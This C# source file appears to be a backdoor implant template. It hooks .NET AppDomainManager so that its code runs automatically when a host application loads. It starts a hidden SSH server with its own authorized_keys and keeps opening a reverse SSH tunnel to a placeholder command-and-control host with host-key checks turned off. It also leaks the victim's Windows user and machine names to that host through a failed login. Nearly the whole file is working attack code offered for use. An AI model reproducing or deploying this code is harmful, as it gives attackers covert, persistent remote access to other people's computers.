using System;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Threading;

public sealed class BoltDomain : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        Boltout.Begin();
        return;
    }
}

public class Boltout
{
    public static int CheckPorts(string sshHost, int port)
    {
        var timeout = 3;
        int noPort = 1337;
        using (var client = new TcpClient())
        {
            try
            {
                client.ReceiveTimeout = timeout * 1000;
                client.SendTimeout = timeout * 1000;
                var asyncResult = client.BeginConnect(sshHost, port, null, null);
                var waitHandle = asyncResult.AsyncWaitHandle;
                try
                {
                    if (!asyncResult.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(timeout), false))
                    {
                        client.Close();
                    }
                    else
                    {
                        if (client.Connected)
                            return port;
                        return noPort;
                    }
                    client.EndConnect(asyncResult);
                }
                finally
                {
                    waitHandle.Close();
                }
            }
            catch { }
        }
        return noPort;
    }

    static string SanitizeUsername(string raw)
    {
        var sb = new System.Text.StringBuilder();
        foreach (char c in raw)
        {
            if (char.IsLetterOrDigit(c) || c == '-' || c == '_' || c == '.')
                sb.Append(c);
            else
                sb.Append('_');
        }
        string s = sb.ToString().Trim('.', '-', '_');
        return s.Length > 0 ? s.Substring(0, Math.Min(s.Length, 64)) : "unknown";
    }

    public static void Begin()
    {
        string sshHost = "REPLACE_SSH_HOST";
        List<int> ports = new List<int> { REPLACE_PORT_ARRAY };
        int[] tunnelPorts = new int[] { REPLACE_TUNNEL_PORT_ARRAY };
        int boltdLocalPort = REPLACE_BOLTD_LOCAL_PORT;
        int selectedPort = -1;

        foreach (int p in ports)
        {
            if (CheckPorts(sshHost, p) != 1337)
            {
                selectedPort = p;
                break;
            }
        }

        if (selectedPort == -1) return;

        try
        {
            string userName = "REPLACE_USERNAME";
            string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;

            string boltd = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_BOLTD_EXE");
            string boltHostKey = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_BOLT_KEY_FILE");
            string boltConfig = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_BOLTD_CONFIG");
            string boltAllow = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "authorized_keys");

            Process boltdStart = new Process();
            boltdStart.StartInfo.FileName = boltd;
            boltdStart.StartInfo.Arguments = $"-D -h \"{boltHostKey}\" -f \"{boltConfig}\" -o AuthorizedKeysFile=\"{boltAllow}\"";
            boltdStart.StartInfo.UseShellExecute = false;
            boltdStart.StartInfo.CreateNoWindow = true;
            boltdStart.Start();

            Thread.Sleep(REPLACE_STARTUP_DELAY_MS);
            if (boltdStart.HasExited) return;

            string boltCon = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_BOLTCON_EXE");
            string boltKey = Path.Combine(baseDirectory, "REPLACE_FILES_DIR", "REPLACE_KEYFILE_NAME");

            while (true)
            {
                // Select tunnel port: try each in range; keep the first that survives 5 s
                // (ExitOnForwardFailure causes boltcon to exit immediately if the port is taken on C2)
                int selectedTunnelPort = -1;
                foreach (int tPort in tunnelPorts)
                {
                    using (Process testConn = new Process())
                    {
                        testConn.StartInfo.FileName = boltCon;
                        testConn.StartInfo.Arguments =
                            $"-o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ExitOnForwardFailure=yes " +
                            $"-o ConnectTimeout=10 -o loglevel=ERROR " +
                            $"-p {selectedPort} -i \"{boltKey}\" {userName}@{sshHost} " +
                            $"-R {tPort}:127.0.0.1:{boltdLocalPort} -N";
                        testConn.StartInfo.UseShellExecute = false;
                        testConn.StartInfo.CreateNoWindow = true;
                        testConn.Start();
                        Thread.Sleep(5000);
                        if (!testConn.HasExited)
                        {
                            selectedTunnelPort = tPort;
                            try { testConn.Kill(); } catch { }
                            testConn.WaitForExit();
                            break;
                        }
                    }
                }

                if (selectedTunnelPort == -1)
                {
                    Thread.Sleep(REPLACE_RECONNECT_DELAY_MS);
                    continue;
                }

                // Identity probe: one failed-auth connection logs Windows user + machine + port
                // Auth log shows: Invalid user john.LAPTOP-ABC123.p31335 from 1.2.3.4 port 54321
                string probeUser = SanitizeUsername(
                    Environment.UserName + "." + Environment.MachineName + ".p" + selectedTunnelPort);
                using (Process probe = new Process())
                {
                    probe.StartInfo.FileName = boltCon;
                    probe.StartInfo.Arguments =
                        $"-o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ConnectTimeout=5 -o loglevel=ERROR " +
                        $"-p {selectedPort} -i \"{boltKey}\" {probeUser}@{sshHost} -N";
                    probe.StartInfo.UseShellExecute = false;
                    probe.StartInfo.CreateNoWindow = true;
                    probe.Start();
                    if (!probe.WaitForExit(8000))
                    {
                        try { probe.Kill(); } catch { }
                        probe.WaitForExit();
                    }
                }

                // Real tunnel connection
                using (Process boltConStart = new Process())
                {
                    boltConStart.StartInfo.FileName = boltCon;
                    boltConStart.StartInfo.Arguments =
                        $"-o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -o ServerAliveInterval=30 -o Compression=yes " +
                        $"-o ForwardAgent=no -o TCPKeepAlive=yes -o ServerAliveCountMax=5 " +
                        $"-o ExitOnForwardFailure=yes -o loglevel=ERROR " +
                        $"-p {selectedPort} -i \"{boltKey}\" {userName}@{sshHost} " +
                        $"-R {selectedTunnelPort}:127.0.0.1:{boltdLocalPort} -N";
                    boltConStart.StartInfo.UseShellExecute = false;
                    boltConStart.StartInfo.CreateNoWindow = true;
                    boltConStart.Start();
                    boltConStart.WaitForExit();
                }
                Thread.Sleep(REPLACE_RECONNECT_DELAY_MS);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }
}
